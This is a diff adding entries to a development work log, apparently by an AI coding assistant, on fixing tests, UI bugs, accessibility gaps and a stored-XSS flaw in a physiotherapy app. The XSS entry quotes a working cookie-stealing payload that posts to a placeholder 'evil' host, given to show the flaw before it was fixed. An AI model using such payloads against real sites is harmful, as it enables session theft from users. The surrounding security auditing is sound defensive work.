@@ -285,4 +285,76 @@ Found one real (minor) bug via this new suite: `aiIntakeParser.js`'s `extraction
 Verified via `@babel/parser` on both touched files. Committed locally as `44fe96e` on top of `41fe126` -- not pushed, same as the round above (user's call to make).
 
 ---
+
+## 2026-08-06 (later still) — Item 1 resolved: "Fill patient record" dead-code decision
+
+The "Fill patient record from this instead" button was removed 2026-07-30, deliberately, with an explicit in-code comment: "hidden from students. extractToRecord() below is untouched and still callable if this gets wired back in later." Confirmed there is no other reachable trigger for `extractToRecord` in the current chat UI -- normal send()/Enter always goes through the conversational `/api/chat` path, never `/api/parse`. So this is a genuine, deliberate, dated product/pedagogical decision, not an accidental break -- not something to reverse unilaterally.
+
+Resolution: didn't restore the button (that reverses someone's intentional call) and didn't delete the 3 broken test files either (that would lose real coverage of `extractToRecord`/`mapParseResultToUpdates`/`confirmExtraction`/the review UI/the 10-region pipeline, all of which are still fully wired and correct, just unreachable via UI right now). Instead:
+- `aiIntakeParser.test.jsx` -- the one test that checked the button appears when `set` is passed was rewritten into a regression test that it **stays hidden regardless** ("never renders... intentionally hidden from students since 2026-07-30"). The 2 tests that clicked the button to drive extraction are `it.skip`'d with a comment explaining why + pointing at re-enabling if the button returns.
+- `aiChatReviewUI.test.jsx` -- whole `describe` block `describe.skip`'d, same reasoning (all 3 tests there depend on the same button click).
+- `aiPipeline10Regions.test.jsx` -- the `test.each` covering all 10 regions changed to `test.skip.each`, same reasoning.
+
+Re-ran all 3 files: 7 passed, 15 skipped, 0 failed (was 3 files red before). Not committed/pushed yet -- user's call, same pattern as prior rounds.
+
+Still open from the 5-item list: item 3 (6 stale tests), item 4 (Hand region/forefoot palpation gap), item 5 (E2E/adversarial/accessibility -- not started).
+
+---
+
+## 2026-08-06 (later still) — Item 2 resolved: both flagged possible bugs
+
+**(a) `posterior_thigh_rt`/`_lt` polygon overlap (0.57 units)** -- real bug, not intended. `bodyChartRegions.test.js`'s own header comment says every other posterior lower-limb `_rt`/`_lt` pair (calf, ankle, foot) had this exact overlap issue already fixed by "shifting each side's polygon apart"; thigh was the one pair still missed, breaking that test's own invariant ("no _rt/_lt region pair overlaps on the x-axis"). Fixed the same way: shifted `posterior_thigh_lt`'s points 0.9 units left in `BodyChartPro.jsx` (max x 84.07 -> 83.17), leaving a 0.33-unit gap from `_rt`'s min x (83.5) -- same order of magnitude as the ankle pair's already-clean 0.71-unit gap. Shape/vertical extent unchanged, purely a horizontal shift.
+
+**(b) `extractionAuditTrail`'s region defaulting to "Knee (R)"** -- not a bug, a stale test. Traced `aiIntakeParser.js`'s region-resolution logic directly: unspecified/bilateral laterality on Knee/Shoulder intentionally resolves to "(R)" so `REGION_PREFIX_MAP` matches and region-specific fields aren't silently dropped -- this was a deliberate fix made earlier this same session (found via a real bilateral-knee intake bug: 11 fields extracted, almost none survived to Run-Analysis), and `aiIntakeParser.test.jsx` already has a regression test locking the same default in. `extractionAuditTrail.test.jsx`'s last test predated that fix and still asserted the old plain "Knee" return. Updated its expectation to "Knee (R)" with a comment pointing at why.
+
+Re-ran `bodyChartRegions`, `extractionAuditTrail`, `bodyChartHitRadiusOverlap`, `aiIntakeParser`: 20 passed, 2 skipped (the intentional item-1 skips), 0 failed. Not committed/pushed yet -- same as prior rounds, push on request.
+
+Still open: item 3 (6 stale tests), item 4 (Hand region/forefoot palpation gap), item 5 (E2E/adversarial/accessibility -- not started).
+
+---
+
+## 2026-08-06 (later still) — Item 3 resolved: all 6 stale tests updated to match real behavior
+
+All 6 were stale assertions, not app bugs -- each traced to a real, deliberate app change the test simply hadn't caught up with:
+
+- **`cervicalTestNav.test.js`** -- "Observation (posture, head position...)" is now mapped (`nav:"observation"`, matching Lumbar's identical pre-existing pattern); moved out of the null-list into its own passing assertion.
+- **`thoracicTestNav.test.js`** -- 3 fixes in one pass: (1) "Rib Springing" now routes to its own dedicated special-test entry (`st_rib_spring`) instead of the old generic rib-mobility screen -- more precise, not a regression. (2) "Observation" is now mapped, same as cervical/lumbar. (3) While re-verifying every regex against the test's own "stays unmapped" list, found 2 more strings the test still claimed were unmapped but aren't: "Passive Scapular Approximation" and "Forestier's Bowstring Sign" both resolve to real special-test entries in the code already -- moved both out of the null-list too.
+- **`summaryModalCrash.test.jsx`** -- the button it clicks was renamed "Run Analysis" -> "🧠 Suggest probable objective assessment" in the 2026-08-06 genericPhase05 redesign; updated the query text (the array-crash logic it actually tests, `v()`/`arr()`, is untouched and still passes).
+- **`objAssessTileNav.test.jsx`** -- the tile-click UI it drives changed in the same redesign: the old separate "OPEN"/"→" buttons are gone, replaced by the action row's own label text being directly clickable. Updated the selector to find elements by their pointer-cursor style instead of now-nonexistent button text.
+- **`subjectiveFormContinuousScroll.test.jsx`** -- the "shared filter box" design this test covered never actually shipped; the select/multicheck fields that did ship (`ComboField`) are independent tap-to-open dropdowns with no search/filter input at all, shared or per-section. Rewrote the test to assert what's actually there (each field gets its own "Tap to select..." control, not a shared one) instead of a feature that doesn't exist in the final implementation.
+
+Re-ran all 5 files: 36 passed, 0 failed (was 6 failed across 5 files, +1 more caught mid-fix in thoracicTestNav). Also spot-checked `lumbarTestNav.test.js` (sibling file, not on the flagged list) -- already clean, 15/15 passing, no drift there. Not committed/pushed yet -- same as prior rounds, push on request.
+
+Still open: item 4 (Hand region/forefoot palpation gap), item 5 (E2E/adversarial/accessibility -- not started).
+
+---
+
+## 2026-08-06 (later still) — Item 4 resolved: Hand/forefoot gap confirmed genuinely honest, not stale
+
+Unlike items 2 and 3, this one checked out clean -- no drift, no bug, code comments still accurate today:
+
+- **Forefoot/metatarsal palpation**: `ANATOMICAL_HOTSPOTS` (ClinicalModules.jsx) still has zero forefoot/metatarsal/toe hotspot -- only heel/plantar points exist for the foot. Confirmed via grep, not just trusting the comment.
+- **Hand region** (`genericTestNav.js`'s `MAP.hand = {}`): traced every real hand keyExam string from `reasoningEngine/regions/hand.examplan.json` (digit/joint palpation, thumb-MCP valgus stress, Hueston tabletop test, A1-pulley palpation, grip/pinch strength) against every data source `genericTestNav`'s resolver actually supports (`rom`/`mmt`/`palpation`/`special` only -- confirmed by reading the resolver function itself, no `outcome`/`fma` kind exists there even though the file's own header comment describes those four as the complete set). Result: `SPECIAL_TESTS_DATA` genuinely has no hand category, `ROM_DATA` genuinely has no Hand region, `ANATOMICAL_HOTSPOTS` genuinely has no finger/thumb/palm point. `MMT_DATA` does have a real "Wrist & Hand" category (individual finger/thumb muscle tests), but none of it is a clean 1:1 match for a composite measure like grip/pinch strength -- mapping it to any single muscle entry would be a guess, which the file's own stated policy ("guessing wrong is worse than leaving it non-clickable") already rules out.
+
+No code changes -- confirmed the existing honest-gap behavior is correct as-is, not stale. Nothing to fix, nothing to push.
+
+Still open: item 5 (E2E/adversarial/accessibility -- not started). All of items 1-4 from the original 5-item list are now resolved.
+
+---
+
+## 2026-08-06 (later still) — Item 5: E2E/adversarial/accessibility
+
+Not "not started" across the board -- E2E turned out to already exist; the other two got real new coverage, including one genuine security bug found and fixed.
+
+**E2E -- mischaracterized, not actually zero.** `e2e/` already has 6 real Playwright specs (`patient-journey`, `ortho-cases` + fixtures, `multi-visit-and-cross-device`, `therapist-mobile`, `smoke-starter`, `commands`) plus `.github/workflows/e2e.yml` wired to run them in CI against a disposable test Supabase project, with a guard step that fails loudly if it ever detects the build accidentally baked in the production project ref. Coverage includes module smoke tests, special tests, SOAP note rendering, PDF export, cross-device sync (login from a second browser context), and full diagnosis-driven flows per ortho case. Could not run any of it here -- `e2e/README.md` already documents that this sandbox specifically can't do `npx playwright install --with-deps` (confirmed still true). What's still genuinely open: the one-time disposable Supabase test project + `E2E_SUPABASE_URL`/`E2E_SUPABASE_ANON_KEY` repo secrets (see `e2e/README.md`) have to be set up by the user outside this sandbox before any of this can actually run and be confirmed green -- that's a real manual step, not something to fake or skip.
+
+**Adversarial input -- found and fixed a real stored-XSS.** Existing "hallucination" tests (`aiIntakeParserAntiHallucination`, `parseApiPromptContent`) check clinical-accuracy hallucination (AI inventing plausible-but-unstated facts) -- not attack-shaped input. Audited all 3 `dangerouslySetInnerHTML`/raw-HTML-write sites in the app; 2 are static lookup tables (safe), but `PostureEngine.jsx`'s `generateReport()` interpolated `patientInfo.name/occupation` and `clinicianInfo.name/credentials/clinic` -- all free-text fields anyone filling in the posture module can type -- raw into an HTML string written via `win.document.write()` into a real, same-origin popup window. A patient name like `<img src=x onerror="fetch('//evil/steal?c='+document.cookie)">` would have executed as a working stored XSS the moment that patient's report was opened or printed. Fixed with an `escHtml()` helper applied once at the point those 5 fields enter the report data object (safer than patching all ~11 interpolation sites individually). New `src/__tests__/postureReportXssEscaping.test.js` (7 tests) locks this in via the same source-read pattern `parseApiPromptContent.test.js` already uses for this same not-easily-unit-testable file. **Note: `PostureEngine.jsx` was copied verbatim into `posture-analysis-standalone`'s own repo earlier this session -- that copy has the same bug and hasn't been fixed, since this pass only touched physiom-main.**
+
+**Accessibility -- was genuinely zero, now has real automated coverage.** Added `jest-axe` (real devDependency, `npm install --save-dev`) + wired `toHaveNoViolations` into `setupTests.js`. New `src/__tests__/accessibilityAudit.test.jsx` runs axe against the Subjective Assessment form (empty state + a region's fields rendered) and the AI Assistant chat (no patient / patient loaded) -- 4 tests. Found and fixed a real bug on the first run: the pain-scale `<input type="range">` sliders (`PainSliderCompact` in `SubjectiveObjective.jsx`) had zero accessible name -- a screen-reader user had no idea what a bare, unlabelled 0-10 slider was. Fixed by threading the field's real label through as `aria-label`, plus `aria-valuetext` for the live value. jsdom can't compute real layout/paint, so this only catches DOM-structural issues (missing labels, invalid ARIA, etc.) -- axe automatically skips color-contrast and similar rules; a real visual/keyboard-trap/focus-order audit still needs a browser, same limitation as the E2E suite above.
+
+Re-ran everything touched: `postureReportXssEscaping` (7/7), `accessibilityAudit` (4/4), plus the adjacent `subjectiveFormContinuousScroll`/`summaryModalCrash`/`objAssessTileNav` suite to confirm the `PainSliderCompact` label change didn't regress anything (18/18). Both touched files (`PostureEngine.jsx`, `SubjectiveObjective.jsx`) verified via `@babel/parser`. Not committed/pushed yet -- same as every round this session, push on request.
+
+All 5 items from the original list now have real work done against them. Two are fully closed (1, 4 -- 4 confirmed as accurately-documented, not a bug). Three landed real fixes with regression coverage (2, 3, 5's a11y+XSS findings). One manual step remains outside this sandbox's reach: standing up the E2E test Supabase project + secrets so the existing Playwright suite can actually run.
+
+---
 Generated 2026-07-30. Updated 2026-08-06.
